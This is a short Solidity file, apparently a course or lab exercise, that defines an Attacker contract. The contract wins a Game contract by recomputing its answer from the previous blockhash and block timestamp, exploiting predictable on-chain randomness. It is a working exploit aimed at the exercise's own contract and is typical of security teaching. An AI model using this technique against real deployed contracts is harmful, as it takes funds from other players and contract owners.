// SPDX-License-Identifier: MIT
import "../../src/week4_game/Game.sol";

pragma solidity >=0.8.0 <0.9.0;
// TODO write attack contract

contract Attacker {
    Game game;

    receive() external payable {}

    constructor(Game _game) payable {
        game = _game;
    }

    function attack() public {
        // attacker just put the answer into input to win the game
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        game.guess(answer, address(this));
    }
}
